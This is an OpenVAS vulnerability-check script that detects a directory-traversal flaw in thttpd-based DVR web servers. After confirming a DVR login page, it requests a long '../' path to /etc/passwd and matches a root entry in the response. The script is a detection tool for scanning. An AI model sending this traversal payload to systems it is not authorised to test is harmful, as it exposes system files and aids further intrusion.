###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_multiple_dvr_dir_traversal_05_2013.nasl 6698 2017-07-12 12:00:17Z cfischer $
#
# Multiple DVR HTTP Server Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The thttpd running on the remote DVR is prone to a directory-traversal vulnerability
because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue will allow an attacker to view arbitrary local
files within the context of the web server. Information harvested may
aid in launching further attacks.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103714";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 6698 $");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

 script_name("Multiple DVR HTTP Server Directory Traversal Vulnerability");

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/60010");
 
 script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:00:17 +0200 (Wed, 12 Jul 2017) $");
 script_tag(name:"creation_date", value:"2013-05-23 09:50:08 +0200 (Thu, 23 May 2013)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("thttpd/banner");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

banner = get_http_banner(port:port);
if("Server: thttpd/" >!< banner)exit(0);

url = "/"; 

if(http_vuln_check(port:port, url:url,pattern:"<title>DVR LOGIN")) {

  url = '/../../../../../../../../../../../../../../../../etc/passwd';

  if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
     
    security_message(port:port);
    exit(0);

  }  

}

exit(0);
